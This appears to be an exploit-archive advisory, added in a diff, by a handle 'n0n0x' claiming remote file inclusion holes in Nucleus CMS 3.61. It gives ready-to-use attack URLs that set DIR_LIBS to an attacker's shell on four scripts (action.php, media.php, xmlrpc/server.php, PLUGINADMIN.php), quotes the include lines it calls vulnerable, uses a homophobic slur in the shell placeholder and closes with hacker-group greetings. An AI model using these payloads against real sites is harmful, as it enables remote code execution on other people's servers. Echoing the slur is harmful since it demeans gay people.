@@ -1,0 +1,63 @@
+#######################################################
+#Nucleus v3.61 <=== Multiple Remote File Include
+#By n0n0x
+#Homepage: http://priasantai.uni.cc/
+#Download script :http://sourceforge.net/projects/nucleuscms/
+#######################################################
+=========================================
+nucleus3.61/action.php?DIR_LIBS=[y0ur g4y sh3ll]?????????????
+
+13. /**
+14.  * File containing actions that can be performed by visitors of the site,
+15.  * like adding comments, etc...
+16.  * @license http://nucleuscms.org/license.txt GNU General Public License
+17.  * @copyright Copyright (C) 2002-2009 The Nucleus Group
+18.  * @version $Id: action.php 1388 2009-07-18 06:31:28Z shizuki $
+19.  */
+20.
+21. $CONF = array();
+22. require('./config.php');
+23.
+24. // common functions
+25. include_once($DIR_LIBS . 'ACTION.php');  <=== RFI vuln
+
+==========================================
+nucleus3.61/nucleus/media.php?DIR_LIBS=[y0ur g4y sh3ll]?????????????
+
+35. // include all classes and config data
+36. require('../config.php');
+37. include($DIR_LIBS . 'MEDIA.php');	// media classes
+
+==========================================
+nucleus3.61/nucleus/xmlrpc/server.php?DIR_LIBS=[y0ur g4y sh3ll]?????????????
+
+63.  * @license http://nucleuscms.org/license.txt GNU General Public License
+64.  * @copyright Copyright (C) 2002-2009 The Nucleus Group
+67.  * @version $Id: server.php 1388 2009-07-18 06:31:28Z shizuki $
+68.  */
+69. $CONF = array();
+70. require("../../config.php");	// include Nucleus libs and code
+71. include($DIR_LIBS . "xmlrpc.inc.php");
+
+==========================================
+nucleus3.61/nucleus/libs/PLUGINADMIN.php?DIR_LIBS=[y0ur g4y sh3ll]?????????????
+
+class PluginAdmin {
+
+	var $strFullName;		// NP_SomeThing
+	var $plugin;			// ref. to plugin object
+	var $bValid;			// evaluates to true when object is considered valid
+	var $admin;				// ref to an admin object
+
+	function PluginAdmin($pluginName)
+	{
+		global $manager;
+                include_once($DIR_LIBS . 'ADMIN.php');   
+
+==========================================
+################################################
+Greetz: all member | manadocoding.org - sekuritiOnline.net
+
+friends: str0ke, angky.tatoki, EA ngel, bL4Ck_3n91n3,  0pa, x0r0n, team_elite
+            devilbat. cr4wl3r, cyberl0g, lumut-, Anti_Hack, DskyMC, mr.c, doniskynet
+################################################
